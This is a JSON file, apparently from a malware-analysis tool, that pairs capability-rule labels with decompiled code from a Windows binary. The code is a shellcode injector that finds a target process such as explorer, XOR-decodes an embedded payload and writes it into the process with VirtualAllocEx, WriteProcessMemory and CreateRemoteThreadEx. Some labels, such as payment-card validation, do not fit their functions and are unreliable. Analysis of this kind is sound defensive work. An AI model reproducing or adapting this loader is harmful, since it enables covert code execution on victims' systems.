{
    "14000100": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140001000(int16_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uVar3;\n    int16_t *piVar4;\n    int16_t iVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uchar auStack728 [32];\n    uchar *puStack696;\n    uint auStack664 [2];\n    uint uStack656;\n    int16_t aiStack620 [266];\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uchar auStack80 [16];\n    uchar auStack64 [8];\n    uint64_t uStack56;\n    \n    // [00] -r-x section size 8192 named .text\n    uStack56 = *0x140005008 ^ auStack728;\n    auStack664[0] = 0x238;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2);\n    uVar9 = 0xffffffff;\n    uVar10 = 0xffffffff;\n    iVar1 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(uVar2, auStack664);\n    if (iVar1 == 1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_Process32NextW)(uVar2, auStack664);\n        while (iVar1 == 1) {\n            uVar8 = 0xffffffffffffffff;\n            do {\n                uVar8 = uVar8 + 1;\n            } while (aiStack620[uVar8] != 0);\n            uVar3 = SUB168(ZEXT816(2) * ZEXT816(uVar8), 0);\n            if (SUB168(ZEXT816(2) * ZEXT816(uVar8) >> 0x40, 0) != 0) {\n                uVar3 = 0xffffffffffffffff;\n            }\n            piVar4 = fcn.140001354(uVar3);\n            iVar1 = 0;\n            if (uVar8 != 0) {\n                iVar6 = aiStack620 - piVar4;\n                piVar7 = piVar4;\n                do {\n                    iVar5 = *(iVar6 + piVar7) + 0x20;\n                    if (0x19 < *(iVar6 + piVar7) - 0x41U) {\n                        iVar5 = *(iVar6 + piVar7);\n                    }\n                    iVar1 = iVar1 + 1;\n                    *piVar7 = iVar5;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 < uVar8);\n            }\n            piVar4[uVar8] = 0;\n            uVar8 = 0xffffffffffffffff;\n            do {\n                uVar8 = uVar8 + 1;\n            } while (arg1[uVar8] != 0);\n            iVar1 = 0;\n            if (uVar8 != 0) {\n                piVar7 = arg1;\n                do {\n                    if (*((piVar4 - arg1) + piVar7) != *piVar7) goto code_r0x000140001199;\n                    iVar1 = iVar1 + 1;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 < uVar8);\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, uStack656);\n            puStack696 = auStack80;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)(uVar3, &uStack88, auStack64);\n            if (((iVar1 != 0) && (uStack84 < uVar10)) && (uStack88 < uVar9)) {\n                uVar9 = uStack88;\n                uVar10 = uStack84;\n            }\ncode_r0x000140001199:\n            iVar1 = (*_sym.imp.KERNEL32.dll_Process32NextW)(uVar2, auStack664);\n        }\n    }\n    fcn.140001330(uStack56 ^ auStack728);\n    return;\n}\n",
        "token_count": 911
    },
    "1400011e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "create thread"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400011ec(void)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    ulong uVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uchar auStack40 [8];\n    ulong uStack32;\n    uint uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x140005008 ^ auStack104;\n    puVar3 = 0x140005040;\n    uStack24 = str.awork._8_4_;\n    uStack32 = CONCAT62(str.awork._0_8_ >> 0x10, 0x72);\n    iVar1 = fcn.140001000(&uStack32);\n    uVar5 = 0x33800;\n    iVar2 = 0x33800;\n    puVar4 = puVar3;\n    if (iVar1 == 0) {\n        iVar1 = fcn.140001000(L\"explorer\");\n        puVar3 = 0x140038840;\n        uVar5 = 0x40400;\n        iVar2 = 0x40400;\n        puVar4 = puVar3;\n        if (iVar1 == 0) goto code_r0x0001400012e9;\n    }\n    do {\n        *puVar3 = *puVar3 ^ 0x90;\n        puVar3 = puVar3 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    uStack72 = CONCAT44(uStack72._4_4_, 0x40);\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0, uVar5, 0x3000);\n    if (iVar2 != 0) {\n        uStack72 = auStack40;\n        (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar2, puVar4, uVar5);\n        uStack48 = 0;\n        uStack56 = 0;\n        uStack64 = 0;\n        uStack72 = NULL;\n        (*_sym.imp.KERNEL32.dll_CreateRemoteThreadEx)(iVar1, 0, 0, iVar2);\n    }\ncode_r0x0001400012e9:\n    fcn.140001330(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 562
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000130c(void)\n\n{\n    fcn.1400011ec();\n    return 0;\n}\n",
        "token_count": 27
    },
    "14000135": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001354(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        iVar2 = sub.api_ms_win_crt_heap_l1_1_0.dll_malloc(arg1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar3 = sub.api_ms_win_crt_heap_l1_1_0.dll__callnewh(arg1);\n    } while (iVar3 != 0);\n    if (arg1 == -1) {\n        fcn.140001f24();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.140001f04();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 181
    },
    "140001d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001d48(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x1400039b8; piVar1 < 0x1400039b8; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x140003200)();\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    }
}